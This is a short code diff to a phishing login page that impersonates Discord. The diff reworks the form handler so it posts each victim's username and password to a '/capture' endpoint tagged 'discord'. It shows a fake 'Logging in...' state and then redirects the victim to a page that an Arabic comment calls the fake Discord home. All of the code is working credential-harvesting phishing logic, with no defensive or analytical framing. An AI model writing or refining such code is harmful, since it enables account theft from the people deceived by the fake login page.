@@ -36,11 +36,20 @@
 <script>
 document.getElementById('f').addEventListener('submit', async e => {
   e.preventDefault();
+  const btn = e.target.querySelector('button');
+  btn.textContent = 'Logging in...';
+  
   const fd = new FormData(e.target);
-  const r = await fetch('/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user:fd.get('user'),pass:fd.get('pass'),brand:'discord'})});
-  const j = await r.json().catch(()=>({}));
-  if(j.redirect){window.location=j.redirect;return;}
-  document.getElementById('msg').textContent = 'Login or password is invalid.';
+  
+  // نرسل البيانات للسيرفر
+  await fetch('/capture', {
+    method:'POST', 
+    headers:{'Content-Type':'application/json'}, 
+    body:JSON.stringify({user:fd.get('user'),pass:fd.get('pass'),brand:'discord'})
+  }).catch(()=>{});
+
+  // ننقله لصفحة ديسكورد الوهمية
+  window.location.href = '/discord-home.html';
 });
 </script>
 </body>
